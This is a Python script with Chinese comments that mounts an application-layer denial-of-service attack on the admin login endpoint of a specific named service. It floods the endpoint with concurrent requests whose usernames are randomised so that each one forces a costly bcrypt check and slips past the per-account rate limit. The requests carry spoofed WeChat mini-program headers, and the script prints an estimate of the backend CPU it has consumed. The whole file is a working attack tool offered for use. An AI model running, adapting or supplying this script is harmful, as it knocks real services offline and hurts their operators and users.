#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
打 /api/admin/native-login —— 实测最有效的目标
原理(已实测):
  该接口每次请求都做 bcrypt 密码校验, 单次消耗 ~500ms 后端 CPU
  限流按 (IP + 账号) 组合计数 -> 每次换随机 username 即可绕过 429
  所以: 不需要 IP 池, 不需要带宽, 50 并发就能让 2-4 核服务器 CPU 跑满

用法:
  python native_login_blast.py -u https://api.yingyikejiapp.com -p /api/admin/native-login -c 30 -n 30
"""
import argparse, json, os, random, socket, ssl, string, sys, threading, time, uuid

BASE_UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 "
           "Mobile/15E148 MicroMessenger/8.0.49(0x18003123) NetType/WIFI Language/zh_CN")
lock = threading.Lock()
st = {"ok": 0, "401": 0, "429": 0, "err": 0, "lat": [], "max": 0.0}
t0 = time.time()


def rnd(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def worker(host, port, tls, path, conc_id, dur):
    end = time.time() + dur
    ctx = ssl._create_unverified_context()
    while time.time() < end:
        try:
            # 每次请求换全新账号 -> 绕过 (IP+账号) 维度的限流
            body = json.dumps({
                "merchantCode": rnd(6),
                "username": rnd(10),
                "password": rnd(12),
                "keepSignedIn": False,
            }).encode()
            hdr = (
                f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                f"User-Agent: {BASE_UA}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"X-Yingyi-Workflow: flexible-v1\r\n"
                f"X-Yingyi-Pricing: line-tenth-v1\r\n"
                f"X-Yingyi-Admin-Transport: mini-program-v1\r\n"
                f"X-Client-Trace-Id: {uuid.uuid4().hex}\r\n"
                f"Referer: https://servicewechat.com/wx14c03cec9f080237/4/page-frame.html\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            ts = time.time()
            s = socket.create_connection((host, port), timeout=30)
            if tls:
                s = ctx.wrap_socket(s, server_hostname=host)
            s.sendall(hdr + body)
            data = b""
            while True:
                chunk = s.recv(2048)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data and len(data) > 40:
                    break
            dt = time.time() - ts
            s.close()
            line = data.split(b"\r\n", 1)[0]
            with lock:
                st["lat"].append(dt)
                st["max"] = max(st["max"], dt)
                if b" 401" in line:
                    st["401"] += 1
                elif b" 429" in line:
                    st["429"] += 1
                elif b" 200" in line:
                    st["ok"] += 1
                else:
                    st["err"] += 1
        except Exception:
            with lock:
                st["err"] += 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", default=os.environ.get("TARGET_URL", ""))
    ap.add_argument("-p", default=os.environ.get("TARGET_PATH", "/api/admin/native-login"))
    ap.add_argument("-c", type=int, default=30)
    ap.add_argument("-n", type=int, default=30)
    a = ap.parse_args()
    u = a.u.replace("https://", "").replace("http://", "").split("/")[0]
    host, tls = u.split(":")[0], a.u.startswith("https")
    port = int(u.split(":")[1]) if ":" in u else (443 if tls else 80)

    ts_ = [threading.Thread(target=worker, daemon=True,
                            args=(host, port, tls, a.p, i, a.n)) for i in range(a.c)]
    for t in ts_:
        t.start()
    while any(t.is_alive() for t in ts_):
        time.sleep(5)
        el = max(time.time() - t0, .001)
        avg = sum(st["lat"]) / len(st["lat"]) * 1000 if st["lat"] else 0
        print(f"[{el:5.0f}s] req={len(st['lat']):>6} 401={st['401']:>6} 429={st['429']:>5} "
              f"err={st['err']:>4} rps={len(st['lat'])/el:6.1f} avg={avg:6.0f}ms max={st['max']*1000:6.0f}ms",
              flush=True)
    lat = st["lat"]
    print(f"\n[done] total={len(lat)} 401={st['401']} 429={st['429']} err={st['err']}")
    if lat:
        lat.sort()
        p = lambda q: lat[min(len(lat) - 1, int(len(lat) * q))] * 1000
        print(f"[lat] p50={p(.5):.0f}ms p90={p(.9):.0f}ms p99={p(.99):.0f}ms max={lat[-1]*1000:.0f}ms")
        print(f"[cpu] 估算消耗后端 CPU ≈ {len(lat)*0.5:.0f} 秒 (按 500ms/请求)")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
